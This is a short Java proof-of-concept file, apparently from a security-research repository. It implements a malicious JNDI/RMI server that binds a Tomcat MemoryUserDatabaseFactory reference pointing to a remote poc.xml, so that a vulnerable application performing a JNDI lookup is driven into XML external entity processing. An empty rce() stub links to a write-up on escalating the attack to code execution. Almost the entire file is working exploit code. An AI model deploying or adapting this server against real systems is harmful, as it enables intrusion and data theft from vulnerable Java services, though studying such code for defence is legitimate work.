package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 */
public class LocalXXERCEServer {
    public static void main(String args[]) throws Exception {
        xxe();

        System.out.println("server is running");
    }

    public static void xxe() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference ref = new Reference("org.apache.catalina.UserDatabase",
                "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:1234/poc.xml"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("xxe", referenceWrapper);
    }

    // todo RCE  https://www.cnblogs.com/bitterz/p/15946406.html#222-rce
    public static void rce() throws Exception {

    }


}
